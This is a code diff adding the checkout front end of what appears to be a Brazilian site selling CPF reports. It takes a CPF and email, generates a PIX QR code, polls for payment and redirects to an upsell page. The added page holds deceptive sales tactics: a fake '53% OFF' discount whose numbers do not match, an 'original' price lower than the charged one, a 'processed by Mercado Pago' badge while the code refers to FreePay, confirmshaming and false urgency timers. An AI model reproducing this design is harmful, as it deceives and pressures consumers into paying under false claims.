+                pixGenerateBtnEl.innerHTML = '<i class="fas fa-lock"></i><span>Gerar PIX agora</span>';
+            }
+
+            // Limpar campo de email
+            if (pixEmailEl) {
+                pixEmailEl.value = '';
+            }
+
+            // Mostrar modal
+            modal.classList.add('show');
+            document.body.style.overflow = 'hidden';
+
+            // Adicionar listener direto no botão quando modal é aberto (garantia adicional)
+            setTimeout(() => {
+                const btn = document.getElementById('pixGenerateBtn');
+                if (btn) {
+                    // Remover listeners anteriores para evitar duplicação
+                    const newBtn = btn.cloneNode(true);
+                    btn.parentNode.replaceChild(newBtn, btn);
+
+                    // Adicionar novo listener direto
+                    newBtn.addEventListener('click', function (e) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        console.log('Botão Gerar PIX clicado (listener direto)!');
+                        generatePix();
+                    });
+                }
+            }, 100);
+
+            console.log('Modal PIX aberto com sucesso');
+        };
+
+        // Função para fechar o modal PIX
+        function closePixModal() {
+            const modal = document.getElementById('pixPaymentModal');
+            if (modal) {
+                modal.classList.remove('show');
+            }
+            document.body.style.overflow = '';
+            if (pixTimerInterval) {
+                clearInterval(pixTimerInterval);
+                pixTimerInterval = null;
+            }
+            if (paymentCheckInterval) {
+                clearInterval(paymentCheckInterval);
+                paymentCheckInterval = null;
+            }
+        }
+
+        // Função para verificar status do pagamento
+        async function checkPaymentStatus() {
+            if (!currentTransactionId) {
+                return;
+            }
+
+            try {
+                const response = await fetch(`verify-status.php?transactionId=${encodeURIComponent(currentTransactionId)}`);
+
+                if (!response.ok) {
+                    return; // Silenciosamente falhar e tentar novamente depois
+                }
+
+                const data = await response.json();
+
+                // Verificar se o pagamento foi confirmado
+                // A FreePay retorna o status em diferentes formatos, vamos verificar ambos
+                const status = data.Status || data.status || data.data?.Status || data.data?.status || '';
+                const statusLower = status.toLowerCase();
+
+                // Verificar se há campo PaidAt indicando pagamento
+                const paidAt = data.PaidAt || data.paidAt || data.data?.PaidAt || data.data?.paidAt;
+
+                if (statusLower === 'paid' || statusLower === 'approved' || statusLower === 'pago' || statusLower === 'aprovado' || paidAt) {
+                    // Pagamento confirmado! Redirecionar para a página de upsell
+                    if (paymentCheckInterval) {
+                        clearInterval(paymentCheckInterval);
+                        paymentCheckInterval = null;
+                    }
+
+                    if (pixTimerInterval) {
+                        clearInterval(pixTimerInterval);
+                        pixTimerInterval = null;
+                    }
+
+                    // Fechar modal
+                    closePixModal();
+
+                    // Redirecionar para a página de pendências com o CPF e transaction_id
+                    const cpfLimpo = currentCpf.replace(/\D/g, '');
+                    window.location.href = `pendencies.html?cpf=${cpfLimpo}&transaction_id=${encodeURIComponent(currentTransactionId)}`;
+                }
+            } catch (error) {
+                console.error('Erro ao verificar status do pagamento:', error);
+                // Continuar verificando mesmo se houver erro
+            }
+        }
+
+        // Função para iniciar verificação periódica do status
+        function startPaymentStatusCheck() {
+            // Verificar a cada 5 segundos
+            if (paymentCheckInterval) {
+                clearInterval(paymentCheckInterval);
+            }
+
+            paymentCheckInterval = setInterval(checkPaymentStatus, 5000);
+
+            // Fazer primeira verificação imediatamente (após 2 segundos para dar tempo do PIX ser processado)
+            setTimeout(checkPaymentStatus, 2000);
+        }
+
+        // Event listeners para fechar o modal (usar delegação de eventos)
+        document.addEventListener('click', function (e) {
+            // Fechar ao clicar no botão de fechar
+            if (e.target.id === 'pixModalClose' || e.target.closest('#pixModalClose')) {
+                closePixModal();
+            }
+            // Fechar ao clicar fora do modal
+            const modal = document.getElementById('pixPaymentModal');
+            if (modal && e.target === modal) {
+                closePixModal();
+            }
+        });
+
+        // Função para gerar o PIX via API
+        async function generatePix() {
+            const pixEmailEl = document.getElementById('pixEmail');
+            const pixGenerateBtnEl = document.getElementById('pixGenerateBtn');
+
+            if (!pixEmailEl || !pixGenerateBtnEl) {
+                alert('Erro: Elementos do formulário não encontrados.');
+                return;
+            }
+
+            const email = pixEmailEl.value.trim();
+            if (!email || !email.includes('@')) {
+                alert('Por favor, insira um e-mail válido.');
+                return;
+            }
+
+            // Desabilitar botão e mostrar loading
+            pixGenerateBtnEl.disabled = true;
+            pixGenerateBtnEl.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Gerando PIX...</span>';
+
+            try {
+                // Chamar o arquivo PHP que gera o PIX
+                const cpfLimpo = currentCpf.replace(/\D/g, '');
+                const response = await fetch(`api/generate-pix.php?amount=${currentPixPrice}&cpf=${cpfLimpo}&email=${encodeURIComponent(email)}`);
+
+                if (!response.ok) {
+                    throw new Error('Erro ao gerar PIX');
+                }
+
+                const data = await response.json();
+
+                if (data.success && data.pix_code) {
+                    // Salvar transaction_id
+                    currentTransactionId = data.transaction_id;
+
+                    // Atualizar preços no modal de QR Code
+                    const priceFormatted = (currentPixPrice / 100).toFixed(2).replace('.', ',');
+                    const pixPriceDisplay = document.getElementById('pixPriceDisplay');
+                    const pixPaymentAmount = document.getElementById('pixPaymentAmount');
+                    if (pixPriceDisplay) {
+                        pixPriceDisplay.textContent = 'R$ ' + priceFormatted;
+                    }
+                    if (pixPaymentAmount) {
+                        pixPaymentAmount.textContent = 'R$ ' + priceFormatted;
+                    }
+
+                    // Mostrar QR Code
+                    const pixQrcodeImageEl = document.getElementById('pixQrcodeImage');
+                    const pixCodeInputEl = document.getElementById('pixCodeInput');
+                    if (pixQrcodeImageEl) {
+                        pixQrcodeImageEl.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pix_code)}`;
+                    }
+                    if (pixCodeInputEl) {
+                        pixCodeInputEl.value = data.pix_code;
+                    }
+
+                    // Ocultar seção de email e mostrar seção do QR Code
+                    const pixModalBodyEmail = document.getElementById('pixModalBodyEmail');
+                    const pixQrcodeSectionEl = document.getElementById('pixQrcodeSection');
+                    if (pixModalBodyEmail) {
+                        pixModalBodyEmail.classList.add('hidden');
+                    }
+                    if (pixQrcodeSectionEl) {
+                        pixQrcodeSectionEl.classList.remove('hidden');
+                    }
+
+                    // Iniciar timer de 15 minutos
+                    startPixTimer(15 * 60);
+
+                    // Iniciar verificação periódica do status do pagamento
+                    startPaymentStatusCheck();
+                } else {
+                    throw new Error(data.error || 'Erro ao gerar PIX');
+                }
+            } catch (error) {
+                console.error('Erro:', error);
+                alert('Erro ao gerar PIX. Por favor, tente novamente.');
+                if (pixGenerateBtnEl) {
+                    pixGenerateBtnEl.disabled = false;
+                    pixGenerateBtnEl.innerHTML = '<i class="fas fa-lock"></i><span>Gerar PIX agora</span>';
+                }
+            }
+        }
+
+        // Função para gerar código PIX aleatório (fallback)
+        function generateRandomPixCode() {
+            const chars = 'abcdef0123456789';
+            let result = '';
+            for (let i = 0; i < 32; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        // Função para iniciar o timer do PIX
+        function startPixTimer(seconds) {
+            let remaining = seconds;
+            updateTimerDisplay(remaining);
+
+            pixTimerInterval = setInterval(() => {
+                remaining--;
+                updateTimerDisplay(remaining);
+
+                if (remaining <= 0) {
+                    clearInterval(pixTimerInterval);
+                    alert('O tempo para pagamento expirou. Por favor, gere um novo PIX.');
+                    closePixModal();
+                }
+            }, 1000);
+        }
+
+        // Função para atualizar o display do timer
+        function updateTimerDisplay(seconds) {
+            const pixTimerEl = document.getElementById('pixTimer');
+            if (pixTimerEl) {
+                const mins = Math.floor(seconds / 60);
+                const secs = seconds % 60;
+                pixTimerEl.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+            }
+        }
+
+        // Event listener para gerar PIX (usar delegação de eventos)
+        document.addEventListener('click', function (e) {
+            const btn = e.target.closest('#pixGenerateBtn');
+            if (btn) {
+                e.preventDefault();
+                e.stopPropagation();
+                console.log('Botão Gerar PIX clicado!');
+                generatePix();
+            }
+        });
+
+        // Função para copiar código PIX (usar delegação de eventos)
+        document.addEventListener('click', function (e) {
+            if (e.target.id === 'pixCopyBtn' || e.target.closest('#pixCopyBtn')) {
+                e.preventDefault();
+                const pixCodeInputEl = document.getElementById('pixCodeInput');
+                const pixCopyBtnEl = document.getElementById('pixCopyBtn');
+                if (pixCodeInputEl && pixCopyBtnEl) {
+                    pixCodeInputEl.select();
+                    document.execCommand('copy');
+                    pixCopyBtnEl.innerHTML = '<i class="fas fa-check"></i> Copiado!';
+                    setTimeout(() => {
+                        pixCopyBtnEl.innerHTML = '<i class="fas fa-copy"></i> Copiar';
+                    }, 2000);
+                }
+            }
+        });
+
+        // =============================================
+        // BOTÃO LIBERAR AGORA - REFEITO DE FORMA SIMPLES
+        // =============================================
+
+        // Função simples para abrir modal quando clicar no botão
+        window.abrirModalPix = function () {
+            console.log('=== Função abrirModalPix chamada ===');
+
+            // Obter CPF do input ou do resultado exibido
+            const cpfInput = document.getElementById('cpfInput');
+            let cpf = '000.000.000-00';
+
+            if (cpfInput && cpfInput.value) {
+                const cpfLimpo = cpfInput.value.replace(/\D/g, '');
+                if (cpfLimpo.length === 11) {
+                    cpf = cpfLimpo.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, '$1.$2.$3-$4');
+                }
+            } else {
+                // Tentar obter do display do resultado
+                const cpfDisplay = document.getElementById('pixCpfDisplay');
+                if (cpfDisplay && cpfDisplay.textContent && cpfDisplay.textContent !== '000.000.000-00') {
+                    cpf = cpfDisplay.textContent;
+                }
+            }
+
+            console.log('CPF obtido:', cpf);
+            console.log('Verificando se window.openPixModal existe:', typeof window.openPixModal);
+
+            // Chamar função openPixModal (global)
+            if (typeof window.openPixModal === 'function') {
+                console.log('Chamando window.openPixModal...');
+                window.openPixModal(1790, 2990, cpf);
+            } else {
+                console.error('window.openPixModal não é uma função!');
+                // Tentar buscar o modal diretamente e abrir
+                const modal = document.getElementById('pixPaymentModal');
+                if (modal) {
+                    console.log('Modal encontrado diretamente, abrindo...');
+                    modal.classList.add('show');
+                    document.body.style.overflow = 'hidden';
+                } else {
+                    alert('Erro: Modal de pagamento não encontrado. Por favor, recarregue a página.');
+                }
+            }
+        };
+
+        // Adicionar event listener usando delegação de eventos no document (mais confiável)
+        document.addEventListener('click', function (e) {
+            // Verificar se clicou no botão LIBERAR AGORA
+            const botao = e.target.closest('#liberarAgoraBtn') ||
+                (e.target.id === 'liberarAgoraBtn' ? e.target : null) ||
+                (e.target.closest('.liberar-btn') && e.target.closest('.liberar-btn').id === 'liberarAgoraBtn' ? e.target.closest('.liberar-btn') : null);
+
+            if (botao) {
+                e.preventDefault();
+                e.stopPropagation();
+                console.log('=== BOTÃO LIBERAR AGORA CLICADO! ===', botao);
+                if (typeof window.abrirModalPix === 'function') {
+                    window.abrirModalPix();
+                } else {
+                    console.error('Função abrirModalPix não encontrada!');
+                }
+            }
+        }, true); // Usar capture phase para garantir que capture o evento
+
+        // Botão do exit intent (R$ 8,49)
+        if (exitOfferBtn) {
+            exitOfferBtn.addEventListener('click', function () {
+                hideExitPopup();
+                const cpfInput = document.getElementById('cpfInput');
+                const cpf = cpfInput ? cpfInput.value : '000.000.000-00';
+                console.log('Botão exit intent clicado, CPF:', cpf);
+                openPixModal(849, 1790, cpf);
+            });
+        }
+
+    </script>
+
+    <!-- Exit Intent Pop-up -->
+    <div class="exit-intent-overlay" id="exitIntentPopup">
+        <div class="exit-intent-modal">
+            <div class="exit-badge"><i class="fas fa-gift"></i> OFERTA EXCLUSIVA</div>
+            <h3><i class="fas fa-hand-paper"></i> ESPERE!</h3>
+            <p class="exit-subtitle">Por ser sua <strong>primeira pesquisa</strong>, temos uma oferta especial para
+                você!</p>
+            <div class="exit-offer-box">
+                <div class="exit-offer-price">
+                    <span>De R$ 87,49</span> R$ 8,49
+                </div>
+                <div class="exit-discount-badge">53% OFF</div>
+            </div>
+            <p class="exit-urgency"><i class="fas fa-clock"></i> Oferta válida apenas agora!</p>
+            <button class="exit-offer-btn" id="exitOfferBtn">
+                <i class="fas fa-unlock"></i> LIBERAR POR R$ 8,49
+            </button>
+            <button class="exit-close-btn" id="exitCloseBtn">
+                Não, prefiro pagar mais caro
+            </button>
+        </div>
+    </div>
+
+    <!-- Modal de Pagamento PIX -->
+    <div class="pix-modal-overlay" id="pixPaymentModal">
+        <div class="pix-modal">
+            <button class="pix-modal-close" id="pixModalClose">&times;</button>
+
+            <!-- Header do Modal -->
+            <div class="pix-modal-header">
+                <div class="pix-modal-icon">
+                    <i class="fas fa-file-alt"></i>
+                </div>
+                <h2>Finalize o pagamento para liberar seu relatório</h2>
+            </div>
+
+            <!-- Corpo do Modal - Estado 1: Solicitação de Email -->
+            <div class="pix-modal-body" id="pixModalBodyEmail">
+                <!-- Campo de Email -->
+                <div class="pix-email-section">
+                    <div class="pix-email-label">
+                        <i class="fas fa-envelope"></i>
+                        <span>E-mail para recebimento do comprovante</span>
+                    </div>
+                    <input type="email" id="pixEmail" class="pix-email-input" placeholder="seu@email.com">
+                </div>
+
+                <!-- Info do Relatório -->
+                <p class="pix-relatorio-info" id="pixRelatorioInfo">Relatório CPF - CPF <span
+                        id="pixCpfDisplay">000.000.000-00</span></p>
+
+                <!-- Caixa de Info PIX -->
+                <div class="pix-info-box">
+                    <div class="pix-info-row">
+                        <i class="fas fa-credit-card"></i>
+                        <span class="pix-info-title">Pague via PIX</span>
+                    </div>
+                    <div class="pix-info-row">
+                        <i class="fas fa-bolt"></i>
+                        <span>Após a confirmação você será redirecionado automaticamente ao relatório completo.</span>
+                    </div>
+                </div>
+
+                <!-- Seção de Preço -->
+                <div class="pix-price-section">
+                    <span class="pix-price-original" id="pixPriceOriginal">De R$ 29,90</span>
+                    <span class="pix-price-current" id="pixPriceCurrent">R$ 87,49</span>
+                </div>
+
+                <!-- Botão de Gerar PIX -->
+                <button class="pix-generate-btn" id="pixGenerateBtn">
+                    <i class="fas fa-lock"></i>
+                    <span>Gerar PIX agora</span>
+                </button>
+            </div>
+
+            <!-- Seção do QR Code (inicialmente oculta) - Estado 2: QR Code PIX -->
+            <div class="pix-qrcode-section hidden" id="pixQrcodeSection">
+                <div class="pix-qrcode-container">
+                    <img id="pixQrcodeImage" src="" alt="QR Code PIX">
+                </div>
+
+                <div class="pix-payment-title">
+                    <i class="fas fa-qrcode"></i>
+                    <span>Pagamento PIX</span>
+                </div>
+
+                <div class="pix-price-display">
+                    <span class="pix-price-label">Valor:</span>
+                    <span class="pix-price-value" id="pixPriceDisplay">R$ 87,49</span>
+                </div>
+
+                <p class="pix-qrcode-instruction">Escaneie o QR Code ou copie o código abaixo</p>
+
+                <div class="pix-code-container">
+                    <label class="pix-code-label">Chave PIX (Copia e Cola):</label>
+                    <div class="pix-code-wrapper">
+                        <input type="text" id="pixCodeInput" readonly>
+                        <button class="pix-copy-btn" id="pixCopyBtn">
+                            <i class="fas fa-copy"></i> Copiar
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Instruções de Pagamento -->
+                <div class="pix-instructions">
+                    <h4 class="pix-instructions-title">Como pagar:</h4>
+                    <ol class="pix-instructions-list">
+                        <li>Abra seu app do banco</li>
+                        <li>Escolha a opção PIX</li>
+                        <li>Escaneie o QR Code ou cole a chave PIX</li>
+                        <li>Confirme o pagamento de <strong id="pixPaymentAmount">R$ 87,49</strong></li>
+                    </ol>
+                </div>
+
+                <div class="pix-timer-container">
+                    <i class="fas fa-clock"></i>
+                    <span>Expira em: <strong id="pixTimer">15:00</strong></span>
+                </div>
+
+                <div class="pix-security-badge">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Pagamento processado pelo Mercado Pago</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
